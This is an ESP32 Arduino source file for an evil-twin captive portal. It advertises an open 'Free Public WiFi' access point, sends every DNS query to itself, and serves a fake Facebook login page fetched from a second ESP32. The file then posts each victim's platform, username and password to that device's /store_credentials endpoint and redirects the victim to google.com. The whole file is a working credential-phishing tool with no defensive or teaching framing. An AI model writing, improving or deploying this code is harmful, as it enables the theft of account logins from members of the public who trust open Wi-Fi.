#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// Credentials for connecting to the Server ESP32
const char* SERVER_SSID = "ServerAP";
const char* SERVER_PASSWORD = "SecureServerPass";

// Public WiFi settings
const char* PUBLIC_WIFI_SSID = "Free Public WiFi";

// Server ESP32's IP address (will be set after connection)
IPAddress serverIP;

DNSServer dnsServer;
WebServer webServer(80);

class CaptivePortalManager {
private:
    bool getLoginPage(String platform) {
        WiFiClient client;
        if (client.connect(serverIP, 80)) {
            String url = "/get_login_page?platform=" + platform;
            
            client.print(String("GET ") + url + " HTTP/1.1\r\n" +
                        "Host: " + serverIP.toString() + "\r\n" +
                        "Connection: close\r\n\r\n");
                        
            while (client.connected() && !client.available()) delay(1);
            
            // Skip HTTP headers
            while (client.available()) {
                String line = client.readStringUntil('\n');
                if (line == "\r") break;
            }
            
            // Get page content
            String pageContent = client.readString();
            client.stop();
            
            webServer.send(200, "text/html", pageContent);
            return true;
        }
        return false;
    }

    void sendCredentialsToServer(String platform, String username, String password) {
        WiFiClient client;
        if (client.connect(serverIP, 80)) {
            String postData = "platform=" + platform + 
                            "&username=" + urlencode(username) + 
                            "&password=" + urlencode(password);
            
            client.println("POST /store_credentials HTTP/1.1");
            client.println("Host: " + serverIP.toString());
            client.println("Content-Type: application/x-www-form-urlencoded");
            client.println("Content-Length: " + String(postData.length()));
            client.println();
            client.println(postData);
            
            while (client.connected()) {
                String line = client.readStringUntil('\n');
                if (line == "\r") break;
            }
            client.stop();
        }
    }

public:
    void begin() {
        // Connect to Server ESP32
        WiFi.begin(SERVER_SSID, SERVER_PASSWORD);
        Serial.print("Connecting to Server ESP32");
        
        while (WiFi.status() != WL_CONNECTED) {
            delay(500);
            Serial.print(".");
        }
        
        serverIP = WiFi.gatewayIP();
        Serial.println("\nConnected to Server ESP32");
        Serial.print("Server IP: ");
        Serial.println(serverIP);

        // Create public access point
        WiFi.softAP(PUBLIC_WIFI_SSID);
        Serial.print("Public AP IP: ");
        Serial.println(WiFi.softAPIP());

        setupDNSServer();
        setupWebServer();
    }

    void setupDNSServer() {
        dnsServer.start(53, "*", WiFi.softAPIP());
    }

    void setupWebServer() {
        webServer.onNotFound([this]() {
            // Serve Facebook login page as default
            getLoginPage("facebook");
        });

        webServer.on("/login", HTTP_POST, [this]() {
            String platform = webServer.arg("platform");
            String username = webServer.arg("username");
            String password = webServer.arg("password");
            
            sendCredentialsToServer(platform, username, password);
            
            // Redirect to success page
            webServer.sendHeader("Location", "http://www.google.com");
            webServer.send(302, "text/plain", "");
        });

        webServer.begin();
    }

    void handleClient() {
        dnsServer.processNextRequest();
        webServer.handleClient();
    }
};

CaptivePortalManager captivePortal;

void setup() {
    Serial.begin(115200);
    captivePortal.begin();
}

void loop() {
    captivePortal.handleClient();
}